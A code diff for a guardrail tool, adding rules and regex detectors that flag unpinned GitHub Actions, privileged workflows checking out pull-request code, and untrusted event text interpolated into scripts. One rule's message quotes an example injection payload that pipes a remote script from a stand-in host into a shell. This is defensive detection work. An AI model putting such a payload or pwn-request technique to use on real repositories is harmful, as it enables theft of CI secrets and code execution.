@@ -75,6 +75,9 @@ const INJECTION_EXCLUDES = [
     "**/node_modules/**", "node_modules/**", "**/vendor/**", "vendor/**", "**/site-packages/**",
 ];
 
+/** GitHub Actions workflow definitions, at the repository root or in a nested project. */
+const WORKFLOW_FILES = [".github/workflows/*.yml", ".github/workflows/*.yaml", "**/.github/workflows/*.yml", "**/.github/workflows/*.yaml"];
+
 /** Files that render UI markup, and the same plus the stylesheets a visual rule also reads. */
 const UI_CODE_FILES = ["*.tsx", "*.jsx", "*.vue", "*.svelte", "*.astro", "*.html", "*.htm"];
 const UI_STYLE_FILES = [...UI_CODE_FILES, "*.css", "*.scss", "*.sass", "*.less"];
@@ -1861,6 +1864,38 @@ export const BUILTIN_RULES: GuardrailRule[] = [
         severity: "block",
         skill: "security-policy",
     },
+    // CI workflows (ci-policy). Measured over the reference repos' workflow files (guardrails.md, "CI WORKFLOW RULES").
+    {
+        id: "ci-action-unpinned",
+        label: "Third-party actions are pinned to a commit SHA",
+        files: [...WORKFLOW_FILES, "action.yml", "action.yaml"],
+        scope: "file",
+        stage: "diff",
+        fileCheck: "ci-action-unpinned",
+        message: "This step runs a third-party action (or reusable workflow) by a tag or branch, and whoever controls that repository can move the tag to new code after you reviewed it - the tj-actions/changed-files compromise in March 2025 rewrote every tag to dump CI secrets. Pin the full 40-character commit SHA with the version as a comment: `uses: owner/action@<sha> # v4.2.1` (resolve it with `gh api repos/<owner>/<action>/commits/<tag> --jq .sha`), and let Dependabot (`package-ecosystem: github-actions`) or Renovate move the pin. A container image is pinned by `@sha256:` digest. Mark the line `enigma:allow-unpinned-action` for an action this organization owns and releases itself (ci-policy).",
+        severity: "block",
+        skill: "ci-policy",
+    },
+    {
+        id: "ci-untrusted-checkout",
+        label: "Privileged workflows never run a pull request's code",
+        files: WORKFLOW_FILES,
+        scope: "file",
+        fileCheck: "ci-untrusted-checkout",
+        message: "This workflow runs on `pull_request_target` or `workflow_run`, which carry the base repository's secrets and a write token, and it checks out the pull request's own code. Any build, install or test step that follows runs code a fork author wrote, with those secrets (a \"pwn request\"). Run the untrusted code under `pull_request` (no secrets, read-only token) and, if a privileged step is needed, pass it only data through an artifact that the `workflow_run` job reads without executing. Mark the line `enigma:allow-untrusted-checkout` when the checked-out files are only read as data and nothing from them is executed or installed (ci-policy).",
+        severity: "block",
+        skill: "ci-policy",
+    },
+    {
+        id: "ci-script-injection",
+        label: "Untrusted event text never reaches a script directly",
+        files: [...WORKFLOW_FILES, "action.yml", "action.yaml"],
+        scope: "file",
+        fileCheck: "ci-script-injection",
+        message: "This script interpolates text that anyone who opens an issue or pull request controls (a title, body, comment, branch name or commit message) with `${{ }}`. Actions substitutes it into the script BEFORE the shell or JavaScript runs, so a title like `\"; curl evil.sh | sh #` becomes code with the job's token and secrets. Pass it through an environment variable and quote it: `env: TITLE: ${{ github.event.issue.title }}` then `\"$TITLE\"` in the script (or `process.env.TITLE` in github-script) (ci-policy).",
+        severity: "block",
+        skill: "ci-policy",
+    },
     {
         id: "sec-secret-compare-timing",
         label: "Secrets are compared in constant time",
@@ -2224,6 +2259,9 @@ export const FILE_CHECKS: Record<string, (content: string, file: string) => { li
     "sec-markdown-html-unsanitized": (content) => unsanitizedMarkdownHtml(content),
     "fe-radix-overlay-no-portal": (content) => radixContentWithoutPortal(content),
     "sec-ssh-host-key-unverified": (content) => unverifiedSshHostKey(content),
+    "ci-action-unpinned": (content) => unpinnedWorkflowAction(content),
+    "ci-untrusted-checkout": (content) => untrustedCheckout(content),
+    "ci-script-injection": (content) => untrustedTextInScript(content),
     "sec-secret-compare-timing": (content, file) => timingUnsafeSecretCompare(content, file),
     "sec-redirect-prefix-check": (content, file) => redirectPrefixCheck(content, file),
     "sec-open-redirect-from-input": (content, file) => redirectFromInput(content, file),
@@ -4510,6 +4548,105 @@ export function unverifiedSshHostKey(content: string): { line: number; detail: s
         if (auditSkipLine(text) || /\bplaceholder\s*[=:]/i.test(text)) continue;
         const m = SSH_HOST_KEY_OFF.map((re) => re.exec(text)).find(Boolean);
         if (m) out.push({ line: i + 1, detail: m[0] });
+    }
+    return out;
+}
+
+// CI workflows.
+/** A `uses:` key, as a step (`- uses:`) or a job calling a reusable workflow. */
+const ACTION_USES = /^\s*(?:-\s+)?uses:\s*["']?([^\s"'#]+)/;
+const FULL_SHA = /^[0-9a-f]{40}$/i;
+const IMAGE_DIGEST = /@sha256:[0-9a-f]{64}$/i;
+
+/**
+ * A third-party action or reusable workflow referenced by a tag or branch instead of a full commit
+ * SHA, or a `docker://` image without a digest. A tag can be moved to new code after review. Local
+ * actions (`./path`) are part of this repository and are not reported.
+ */
+export function unpinnedWorkflowAction(content: string): { line: number; detail: string; }[] {
+    const out: { line: number; detail: string; }[] = [];
+    const lines = content.split("\n");
+    for (let i = 0; i < lines.length; i++) {
+        const text = lines[i]!;
+        if (auditSkipLine(text)) continue;
+        const ref = ACTION_USES.exec(text)?.[1];
+        if (!ref || ref.startsWith("./") || ref.startsWith("../") || ref.includes("${{")) continue;
+        if (ref.startsWith("docker://")) {
+            if (!IMAGE_DIGEST.test(ref)) out.push({ line: i + 1, detail: ref });
+            continue;
+        }
+        const at = ref.lastIndexOf("@");
+        if (at < 0 || !FULL_SHA.test(ref.slice(at + 1))) out.push({ line: i + 1, detail: ref });
+    }
+    return out;
+}
+
+/** A trigger that runs with the base repository's secrets and a write token whatever the pull request contains. */
+const PRIVILEGED_TRIGGER = /\b(?:pull_request_target|workflow_run)\b/;
+/** The pull request's own code: its head commit or branch, or the refs GitHub keeps for it. */
+const PR_HEAD_REF = /\$\{\{[^}]*\b(?:github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref|github\.event\.workflow_run\.head_(?:sha|branch))\b|refs\/pull\/(?:\$\{\{[^}]*\}\}|[^\s"'/]+)\/(?:head|merge)\b/;
+/** Where that ref turns into a working tree: checkout's `ref:` input, or git/gh fetching it in a script. */
+const CHECKOUT_SITE = /^\s*(?:-\s+)?ref:|\bgit\s+(?:fetch|checkout|switch|pull|worktree)\b|\bgh\s+pr\s+checkout\b/;
+/** A condition that admits only pull requests opened from this repository, never from a fork. */
+const SAME_REPO_GUARD = /\b(?:workflow_run\.head_repository|pull_request\.head\.repo)\.(?:full_name|fork)\b/;
+
+/**
+ * A `pull_request_target` or `workflow_run` workflow that checks out the pull request's head. Both
+ * triggers carry secrets and a write token even for a fork, so any later step that builds, installs
+ * or tests that tree runs the fork author's code with them. `gh pr checkout` needs no ref to do it.
+ * A workflow that compares the head repository with its own (or rejects forks) is not reported.
+ */
+export function untrustedCheckout(content: string): { line: number; detail: string; }[] {
+    const lines = content.split("\n");
+    const live = lines.filter((l) => !COMMENT_LINE.test(l));
+    if (!live.some((l) => PRIVILEGED_TRIGGER.test(l)) || live.some((l) => SAME_REPO_GUARD.test(l))) return [];
+    const out: { line: number; detail: string; }[] = [];
+    for (let i = 0; i < lines.length; i++) {
+        const text = lines[i]!;
+        if (auditSkipLine(text) || !CHECKOUT_SITE.test(text)) continue;
+        const head = PR_HEAD_REF.exec(text) ?? /\bgh\s+pr\s+checkout\b/.exec(text);
+        if (head) out.push({ line: i + 1, detail: head[0] });
+    }
+    return out;
+}
+
+/**
+ * Event fields an outside contributor writes, per GitHub's script-injection guidance: issue, pull
+ * request and discussion titles and bodies, comment and review bodies, branch names, commit messages
+ * and author names, wiki page names, and the head branch a `workflow_run` reports.
+ */
+const UNTRUSTED_EVENT_TEXT = /\$\{\{[^}]*?\b(github\.head_ref|github\.event\.(?:issue|pull_request|discussion)\.(?:title|body)|github\.event\.(?:comment|review|review_comment)\.body|github\.event\.pages\b[^}]*?\.page_name|github\.event\.head_commit\.(?:message|author\.(?:email|name))|github\.event\.commits\b[^}]*?\.(?:message|author\.(?:email|name))|github\.event\.pull_request\.head\.(?:ref|label|repo\.default_branch)|github\.event\.workflow_run\.(?:head_branch|display_title|head_commit\.message))\b/;
+/** A `run:` (shell) or `script:` (actions/github-script) key, and whatever follows it on the line. */
+const SCRIPT_KEY = /^(\s*)(-\s+)?(?:run|script):\s*(.*)$/;
+const BLOCK_SCALAR = /^[|>][-+0-9]*\s*(?:#.*)?$/;
+
+/**
+ * Untrusted event text interpolated with `${{ }}` inside a `run:` or `script:` body. The expression
+ * is substituted before the interpreter starts, so the text becomes code. Inside a block scalar
+ * every line is checked, a shell comment included: a newline in a title ends the comment.
+ */
+export function untrustedTextInScript(content: string): { line: number; detail: string; }[] {
+    const out: { line: number; detail: string; }[] = [];
+    const lines = content.split("\n");
+    const check = (text: string, i: number): void => {
+        if (/enigma:/.test(text)) return;
+        const m = UNTRUSTED_EVENT_TEXT.exec(text);
+        if (m) out.push({ line: i + 1, detail: m[1]! });
+    };
+    let bodyAbove = -1;
+    for (let i = 0; i < lines.length; i++) {
+        const text = lines[i]!;
+        if (bodyAbove >= 0) {
+            if (text.trim() === "") continue;
+            if (text.length - text.trimStart().length > bodyAbove) { check(text, i); continue; }
+            bodyAbove = -1;
+        }
+        if (COMMENT_LINE.test(text)) continue;
+        const key = SCRIPT_KEY.exec(text);
+        if (!key) continue;
+        const rest = key[3]!;
+        if (BLOCK_SCALAR.test(rest)) bodyAbove = key[1]!.length + (key[2]?.length ?? 0);
+        else check(rest, i);
     }
     return out;
 }
